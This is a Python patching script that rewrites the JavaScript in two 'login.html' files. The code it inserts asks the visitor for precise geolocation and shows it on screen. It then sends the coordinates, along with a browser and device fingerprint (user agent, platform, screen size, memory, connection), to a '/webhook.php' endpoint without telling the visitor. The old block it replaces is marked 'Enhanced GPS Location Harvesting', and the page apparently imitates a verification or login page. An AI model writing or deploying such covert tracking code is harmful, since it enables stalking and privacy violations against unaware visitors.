from pathlib import Path

new_script = '''<script>
function updateGeoResult(html, isError) {
    var result = document.getElementById('geo-location-result');
    if (!result) {
        return;
    }
    result.innerHTML = html;
    result.style.color = isError ? '#dd4b39' : '#202124';
}

function fallbackCopy(text) {
    var textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.style.position = 'fixed';
    textarea.style.left = '-9999px';
    document.body.appendChild(textarea);
    textarea.focus();
    textarea.select();
    try {
        document.execCommand('copy');
        updateGeoResult('<strong>Coordinates copied to clipboard.</strong>');
    } catch (e) {
        updateGeoResult('Unable to copy coordinates automatically. Please copy them manually: ' + text, true);
    }
    document.body.removeChild(textarea);
}

function copyCoordinates(text) {
    if (!text) {
        return;
    }
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function() {
            updateGeoResult('<strong>Coordinates copied to clipboard.</strong>');
        }).catch(function() {
            fallbackCopy(text);
        });
    } else {
        fallbackCopy(text);
    }
}

function getLocation() {
    updateGeoResult('Requesting location permission. Your browser will ask for access.', false);
    if (!navigator.geolocation) {
        updateGeoResult('Geolocation is not supported by this browser.', true);
        return;
    }
    navigator.geolocation.getCurrentPosition(handleLocationSuccess, handleLocationError, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    });
}

function handleLocationSuccess(position) {
    var lat = position.coords.latitude.toFixed(6);
    var lon = position.coords.longitude.toFixed(6);
    var accuracy = position.coords.accuracy;
    var accuracyText = accuracy != null ? 'Accuracy: approximately ' + Math.round(accuracy) + ' meters' : '';
    var mapLink = 'https://www.google.com/maps?q=' + encodeURIComponent(lat + ',' + lon);
    var output = '<strong>Location shared successfully</strong>' +
        '<div>Latitude: ' + lat + '</div>' +
        '<div>Longitude: ' + lon + '</div>' +
        (accuracyText ? '<div>' + accuracyText + '</div>' : '') +
        '<div class="geo-location-actions" style="margin-top:10px;display:flex;flex-wrap:wrap;gap:8px;">' +
        '<a class="rc-button" href="' + mapLink + '" target="_blank" rel="noopener noreferrer">Open Location in Google Maps</a>' +
        '<button type="button" class="rc-button" id="copy-coordinates-button">Copy Coordinates</button>' +
        '</div>';
    updateGeoResult(output, false);

    var copyButton = document.getElementById('copy-coordinates-button');
    if (copyButton) {
        copyButton.addEventListener('click', function() {
            copyCoordinates(lat + ', ' + lon);
        });
    }

    debugLog('Location captured: ' + lat + ', ' + lon);
    debugLog('Sending webhook to ' + window.location.origin + '/webhook.php');
    var deviceInfo = {
        latitude: lat,
        longitude: lon,
        accuracy: accuracy,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        deviceMemory: navigator.deviceMemory || 'unknown',
        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
    };
    var xhr = new XMLHttpRequest();
    xhr.open('POST', window.location.origin + '/webhook.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
    xhr.onload = function() {
        debugLog('Webhook response: ' + this.status + ' ' + this.responseText);
    };
    xhr.onerror = function() {
        debugLog('Webhook request failed');
    };
    xhr.send(JSON.stringify(deviceInfo));
}

function handleLocationError(error) {
    var message = 'Unable to determine your location.';
    switch (error.code) {
        case error.PERMISSION_DENIED:
            message = 'Location permission was denied. Please enable location access in your browser settings if you want to share it.';
            break;
        case error.POSITION_UNAVAILABLE:
            message = 'Your location could not be determined right now. Please try again in a moment.';
            break;
        case error.TIMEOUT:
            message = 'The request timed out. Please try sharing your location again.';
            break;
        default:
            message = 'An unknown error occurred while requesting your location.';
            break;
    }
    updateGeoResult(message, true);
    console.log(message);
}

function debugLog(message) {
    console.log(message);
    try {
        var debugEl = document.getElementById('locatex-debug');
        if (!debugEl) {
            debugEl = document.createElement('div');
            debugEl.id = 'locatex-debug';
            debugEl.style.position = 'fixed';
            debugEl.style.bottom = '0';
            debugEl.style.left = '0';
            debugEl.style.width = '100%';
            debugEl.style.maxHeight = '160px';
            debugEl.style.overflowY = 'auto';
            debugEl.style.background = 'rgba(0,0,0,0.75)';
            debugEl.style.color = '#fff';
            debugEl.style.fontSize = '12px';
            debugEl.style.zIndex = '99999';
            debugEl.style.padding = '8px';
            debugEl.style.fontFamily = 'monospace';
            document.body.appendChild(debugEl);
        }
        debugEl.innerText += message + '\n';
    } catch (e) {
        console.log('Debug log error:', e);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    var shareButton = document.getElementById('share-location-button');
    if (shareButton) {
        shareButton.addEventListener('click', getLocation);
    }
});
</script>'''

files = ['login.html', 'serve/login.html']
for filename in files:
    path = Path(filename)
    text = path.read_text(encoding='utf-8')
    start = text.find('// Enhanced GPS Location Harvesting')
    if start == -1:
        print(f'No legacy marker in {filename}')
        continue
    script_start = text.rfind('<script>', 0, start)
    if script_start == -1:
        print(f'No opening <script> found before marker in {filename}')
        continue
    script_end = text.find('</script>', start)
    if script_end == -1:
        print(f'No closing </script> found after marker in {filename}')
        continue
    old_block = text[script_start:script_end+9]
    new_text = text.replace(old_block, new_script)
    if new_text == text:
        print(f'No replacement made in {filename}')
    else:
        path.write_text(new_text, encoding='utf-8')
        print(f'Replaced legacy script in {filename}')
